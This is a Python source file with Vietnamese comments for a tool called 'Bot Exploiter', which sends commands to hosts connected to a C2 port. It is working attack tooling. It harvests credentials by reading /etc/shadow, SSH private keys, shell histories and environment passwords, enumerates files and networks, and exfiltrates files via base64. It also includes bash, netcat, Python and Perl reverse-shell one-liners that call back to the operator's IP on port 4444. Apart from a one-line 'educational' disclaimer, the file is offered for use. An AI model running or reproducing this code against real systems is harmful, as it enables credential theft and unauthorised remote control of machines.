#!/usr/bin/env python3
"""
Bot Exploiter - Khai thác thông tin từ bot lạ đã kết nối
Reverse exploitation tool để thu thập thông tin từ attackers
"""

import os
import sys
import time
import json
import socket
import threading
import subprocess
import requests
from datetime import datetime
from typing import Dict, List, Set, Optional
import base64
import hashlib

class BotExploiter:
    def __init__(self, c2_port=7777):
        self.c2_port = c2_port
        self.exploited_bots = {}
        self.collected_data = {}
        self.exploitation_log = "bot_exploitation.log"
        self.target_bots = []
        
    def log_exploitation(self, action: str, target: str, data: str):
        """Log exploitation activities"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'target': target,
            'data': data
        }
        
        try:
            with open(self.exploitation_log, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
        except Exception as e:
            print(f"❌ Error logging: {e}")
    
    def get_connected_bots(self) -> List[Dict]:
        """Lấy danh sách bot đang kết nối"""
        bots = []
        
        try:
            result = subprocess.run([
                'netstat', '-tulpn'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if f":{self.c2_port}" in line and "ESTABLISHED" in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            remote_addr = parts[4]
                            if ':' in remote_addr:
                                ip, port = remote_addr.rsplit(':', 1)
                                try:
                                    port = int(port)
                                    bots.append({
                                        'ip': ip,
                                        'port': port,
                                        'status': 'connected',
                                        'timestamp': datetime.now().isoformat()
                                    })
                                except ValueError:
                                    continue
            
        except Exception as e:
            print(f"❌ Error getting bots: {e}")
        
        return bots
    
    def send_command_to_bot(self, bot_ip: str, bot_port: int, command: str) -> Optional[str]:
        """Gửi command đến bot và nhận response"""
        try:
            # Tạo connection đến bot
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Kết nối đến bot
            sock.connect((bot_ip, bot_port))
            
            # Gửi command
            sock.send(f"{command}\n".encode())
            
            # Nhận response
            response = sock.recv(4096).decode().strip()
            
            sock.close()
            
            self.log_exploitation("COMMAND_SENT", f"{bot_ip}:{bot_port}", f"Command: {command}, Response: {response}")
            return response
            
        except Exception as e:
            print(f"❌ Error sending command to {bot_ip}:{bot_port}: {e}")
            return None
    
    def exploit_system_info(self, bot_ip: str, bot_port: int) -> Dict:
        """Khai thác thông tin hệ thống từ bot"""
        print(f"🔍 Exploiting system info from {bot_ip}:{bot_port}")
        
        system_info = {
            'ip': bot_ip,
            'port': bot_port,
            'timestamp': datetime.now().isoformat(),
            'hostname': None,
            'os': None,
            'user': None,
            'processes': [],
            'network': [],
            'files': [],
            'credentials': []
        }
        
        # Commands để khai thác thông tin
        info_commands = {
            'hostname': 'hostname',
            'os': 'uname -a',
            'user': 'whoami',
            'processes': 'ps aux',
            'network': 'netstat -tulpn',
            'files': 'ls -la /home',
            'credentials': 'cat /etc/passwd'
        }
        
        for info_type, command in info_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    system_info[info_type] = response
                    print(f"  ✅ {info_type}: {response[:100]}...")
                else:
                    print(f"  ❌ Failed to get {info_type}")
            except Exception as e:
                print(f"  ❌ Error getting {info_type}: {e}")
        
        return system_info
    
    def exploit_credentials(self, bot_ip: str, bot_port: int) -> List[Dict]:
        """Khai thác credentials từ bot"""
        print(f"🔐 Exploiting credentials from {bot_ip}:{bot_port}")
        
        credentials = []
        
        # Commands để tìm credentials
        cred_commands = [
            'cat /etc/passwd',
            'cat /etc/shadow',
            'cat ~/.ssh/id_rsa',
            'cat ~/.ssh/id_rsa.pub',
            'cat ~/.bash_history',
            'cat ~/.mysql_history',
            'cat ~/.pgpass',
            'env | grep -i pass',
            'find /home -name "*.pem" -o -name "*.key" -o -name "*.p12"',
            'cat /etc/hosts',
            'arp -a'
        ]
        
        for command in cred_commands:
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response and len(response) > 10:
                    credentials.append({
                        'command': command,
                        'data': response,
                        'timestamp': datetime.now().isoformat()
                    })
                    print(f"  ✅ Found data with: {command}")
                    self.log_exploitation("CREDENTIALS_FOUND", f"{bot_ip}:{bot_port}", f"Command: {command}")
            except Exception as e:
                print(f"  ❌ Error with {command}: {e}")
        
        return credentials
    
    def exploit_network_info(self, bot_ip: str, bot_port: int) -> Dict:
        """Khai thác thông tin mạng từ bot"""
        print(f"🌐 Exploiting network info from {bot_ip}:{bot_port}")
        
        network_info = {
            'ip': bot_ip,
            'port': bot_port,
            'timestamp': datetime.now().isoformat(),
            'interfaces': None,
            'routes': None,
            'connections': None,
            'dns': None,
            'arp': None
        }
        
        network_commands = {
            'interfaces': 'ip addr show',
            'routes': 'ip route show',
            'connections': 'netstat -tulpn',
            'dns': 'cat /etc/resolv.conf',
            'arp': 'arp -a'
        }
        
        for info_type, command in network_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    network_info[info_type] = response
                    print(f"  ✅ {info_type}: {response[:100]}...")
            except Exception as e:
                print(f"  ❌ Error getting {info_type}: {e}")
        
        return network_info
    
    def exploit_files(self, bot_ip: str, bot_port: int) -> List[Dict]:
        """Khai thác files từ bot"""
        print(f"📁 Exploiting files from {bot_ip}:{bot_port}")
        
        files = []
        
        # Commands để tìm files quan trọng
        file_commands = [
            'find /home -name "*.txt" -o -name "*.log" -o -name "*.conf"',
            'find /etc -name "*.conf" -o -name "*.cfg"',
            'ls -la /var/log/',
            'cat /var/log/auth.log | tail -20',
            'cat /var/log/syslog | tail -20',
            'find /tmp -type f -name "*"',
            'ls -la /root/',
            'cat ~/.bashrc',
            'cat ~/.profile'
        ]
        
        for command in file_commands:
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response and len(response) > 10:
                    files.append({
                        'command': command,
                        'data': response,
                        'timestamp': datetime.now().isoformat()
                    })
                    print(f"  ✅ Found files with: {command}")
            except Exception as e:
                print(f"  ❌ Error with {command}: {e}")
        
        return files
    
    def reverse_shell_exploit(self, bot_ip: str, bot_port: int) -> bool:
        """Tạo reverse shell để khai thác bot"""
        print(f"🐚 Attempting reverse shell exploit on {bot_ip}:{bot_port}")
        
        try:
            # Commands để tạo reverse shell
            reverse_commands = [
                f'bash -i >& /dev/tcp/{self.get_local_ip()}/4444 0>&1',
                f'nc -e /bin/bash {self.get_local_ip()} 4444',
                f'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{self.get_local_ip()}\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\'])"',
                f'perl -e \'use Socket;$i="{self.get_local_ip()};$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
            ]
            
            for command in reverse_commands:
                try:
                    response = self.send_command_to_bot(bot_ip, bot_port, command)
                    if response:
                        print(f"  ✅ Reverse shell command sent: {command}")
                        self.log_exploitation("REVERSE_SHELL", f"{bot_ip}:{bot_port}", command)
                        return True
                except Exception as e:
                    print(f"  ❌ Error with reverse shell: {e}")
            
            return False
            
        except Exception as e:
            print(f"❌ Reverse shell exploit failed: {e}")
            return False
    
    def get_local_ip(self) -> str:
        """Lấy local IP để tạo reverse shell"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def download_file_from_bot(self, bot_ip: str, bot_port: int, remote_file: str, local_file: str) -> bool:
        """Download file từ bot"""
        print(f"📥 Downloading {remote_file} from {bot_ip}:{bot_port}")
        
        try:
            # Sử dụng base64 để encode file
            command = f'base64 -w 0 {remote_file}'
            response = self.send_command_to_bot(bot_ip, bot_port, command)
            
            if response:
                # Decode và save file
                file_data = base64.b64decode(response)
                with open(local_file, 'wb') as f:
                    f.write(file_data)
                
                print(f"  ✅ Downloaded {remote_file} to {local_file}")
                self.log_exploitation("FILE_DOWNLOAD", f"{bot_ip}:{bot_port}", f"Downloaded: {remote_file}")
                return True
            else:
                print(f"  ❌ Failed to download {remote_file}")
                return False
                
        except Exception as e:
            print(f"❌ Error downloading file: {e}")
            return False
    
    def full_exploitation(self, bot_ip: str, bot_port: int) -> Dict:
        """Khai thác toàn diện bot"""
        print(f"🎯 Starting full exploitation of {bot_ip}:{bot_port}")
        print("=" * 60)
        
        exploitation_result = {
            'target': f"{bot_ip}:{bot_port}",
            'timestamp': datetime.now().isoformat(),
            'system_info': {},
            'credentials': [],
            'network_info': {},
            'files': [],
            'reverse_shell': False,
            'downloaded_files': []
        }
        
        # 1. System info
        print("1️⃣ Collecting system information...")
        exploitation_result['system_info'] = self.exploit_system_info(bot_ip, bot_port)
        
        # 2. Credentials
        print("\n2️⃣ Collecting credentials...")
        exploitation_result['credentials'] = self.exploit_credentials(bot_ip, bot_port)
        
        # 3. Network info
        print("\n3️⃣ Collecting network information...")
        exploitation_result['network_info'] = self.exploit_network_info(bot_ip, bot_port)
        
        # 4. Files
        print("\n4️⃣ Collecting files...")
        exploitation_result['files'] = self.exploit_files(bot_ip, bot_port)
        
        # 5. Reverse shell
        print("\n5️⃣ Attempting reverse shell...")
        exploitation_result['reverse_shell'] = self.reverse_shell_exploit(bot_ip, bot_port)
        
        # 6. Download important files
        print("\n6️⃣ Downloading important files...")
        important_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '~/.bash_history',
            '~/.ssh/id_rsa'
        ]
        
        for remote_file in important_files:
            local_file = f"downloaded_{bot_ip}_{remote_file.replace('/', '_')}"
            if self.download_file_from_bot(bot_ip, bot_port, remote_file, local_file):
                exploitation_result['downloaded_files'].append(local_file)
        
        # Save exploitation result
        result_file = f"exploitation_result_{bot_ip}_{int(time.time())}.json"
        with open(result_file, 'w') as f:
            json.dump(exploitation_result, f, indent=2)
        
        print(f"\n✅ Exploitation completed! Results saved to {result_file}")
        return exploitation_result
    
    def interactive_exploitation(self):
        """Interactive exploitation mode"""
        print("🎯 Bot Exploiter - Interactive Mode")
        print("=" * 50)
        
        while True:
            print("\n📋 Available commands:")
            print("  1. scan     - Scan connected bots")
            print("  2. exploit  - Exploit specific bot")
            print("  3. info     - Get system info from bot")
            print("  4. creds    - Get credentials from bot")
            print("  5. network  - Get network info from bot")
            print("  6. files    - Get files from bot")
            print("  7. shell    - Attempt reverse shell")
            print("  8. download - Download file from bot")
            print("  9. quit     - Exit")
            
            try:
                command = input("\n🎯 exploiter@c2:~$ ").strip().lower()
                
                if command == "scan":
                    bots = self.get_connected_bots()
                    print(f"\n🤖 Found {len(bots)} connected bots:")
                    for i, bot in enumerate(bots):
                        print(f"  [{i+1}] {bot['ip']}:{bot['port']} - {bot['status']}")
                
                elif command == "exploit":
                    bots = self.get_connected_bots()
                    if not bots:
                        print("❌ No bots connected")
                        continue
                    
                    print("\n🤖 Select bot to exploit:")
                    for i, bot in enumerate(bots):
                        print(f"  [{i+1}] {bot['ip']}:{bot['port']}")
                    
                    try:
                        choice = int(input("Enter bot number: ")) - 1
                        if 0 <= choice < len(bots):
                            bot = bots[choice]
                            self.full_exploitation(bot['ip'], bot['port'])
                        else:
                            print("❌ Invalid choice")
                    except ValueError:
                        print("❌ Invalid input")
                
                elif command == "info":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.exploit_system_info(ip, port)
                
                elif command == "creds":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.exploit_credentials(ip, port)
                
                elif command == "network":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.exploit_network_info(ip, port)
                
                elif command == "files":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.exploit_files(ip, port)
                
                elif command == "shell":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.reverse_shell_exploit(ip, port)
                
                elif command == "download":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    remote_file = input("Enter remote file path: ").strip()
                    local_file = input("Enter local file name: ").strip()
                    self.download_file_from_bot(ip, port, remote_file, local_file)
                
                elif command == "quit":
                    break
                
                else:
                    print("❓ Unknown command")
                    
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Bot Exploiter - Reverse Exploitation Tool")
    parser.add_argument('--scan', action='store_true', help='Scan connected bots')
    parser.add_argument('--exploit', type=str, help='Exploit specific bot (IP:PORT)')
    parser.add_argument('--info', type=str, help='Get system info from bot (IP:PORT)')
    parser.add_argument('--creds', type=str, help='Get credentials from bot (IP:PORT)')
    parser.add_argument('--network', type=str, help='Get network info from bot (IP:PORT)')
    parser.add_argument('--files', type=str, help='Get files from bot (IP:PORT)')
    parser.add_argument('--shell', type=str, help='Attempt reverse shell (IP:PORT)')
    parser.add_argument('--download', type=str, help='Download file from bot (IP:PORT:REMOTE_FILE:LOCAL_FILE)')
    parser.add_argument('--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('--port', type=int, default=7777, help='C2 port to monitor')
    
    args = parser.parse_args()
    
    exploiter = BotExploiter(args.port)
    
    if args.scan:
        bots = exploiter.get_connected_bots()
        print(f"🤖 Found {len(bots)} connected bots:")
        for bot in bots:
            print(f"  🔸 {bot['ip']}:{bot['port']} - {bot['status']}")
    
    elif args.exploit:
        if ':' in args.exploit:
            ip, port = args.exploit.split(':', 1)
            port = int(port)
            exploiter.full_exploitation(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.info:
        if ':' in args.info:
            ip, port = args.info.split(':', 1)
            port = int(port)
            exploiter.exploit_system_info(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.creds:
        if ':' in args.creds:
            ip, port = args.creds.split(':', 1)
            port = int(port)
            exploiter.exploit_credentials(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.network:
        if ':' in args.network:
            ip, port = args.network.split(':', 1)
            port = int(port)
            exploiter.exploit_network_info(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.files:
        if ':' in args.files:
            ip, port = args.files.split(':', 1)
            port = int(port)
            exploiter.exploit_files(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.shell:
        if ':' in args.shell:
            ip, port = args.shell.split(':', 1)
            port = int(port)
            exploiter.reverse_shell_exploit(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.download:
        if ':' in args.download:
            parts = args.download.split(':')
            if len(parts) >= 4:
                ip, port, remote_file, local_file = parts[0], int(parts[1]), parts[2], parts[3]
                exploiter.download_file_from_bot(ip, port, remote_file, local_file)
            else:
                print("❌ Invalid format. Use IP:PORT:REMOTE_FILE:LOCAL_FILE")
        else:
            print("❌ Invalid format. Use IP:PORT:REMOTE_FILE:LOCAL_FILE")
    
    elif args.interactive:
        exploiter.interactive_exploitation()
    
    else:
        print("🎯 Bot Exploiter - Reverse Exploitation Tool")
        print("⚠️  For educational/research purposes only!")
        print("")
        print("Available commands:")
        print("  --scan        Scan connected bots")
        print("  --exploit     Full exploitation (IP:PORT)")
        print("  --info        System info (IP:PORT)")
        print("  --creds       Credentials (IP:PORT)")
        print("  --network     Network info (IP:PORT)")
        print("  --files       Files (IP:PORT)")
        print("  --shell       Reverse shell (IP:PORT)")
        print("  --download    Download file (IP:PORT:REMOTE:LOCAL)")
        print("  --interactive Interactive mode")
        print("")
        print("Examples:")
        print("  python3 bot_exploiter.py --scan")
        print("  python3 bot_exploiter.py --exploit 192.168.1.100:7777")
        print("  python3 bot_exploiter.py --interactive")

if __name__ == "__main__":
    main()
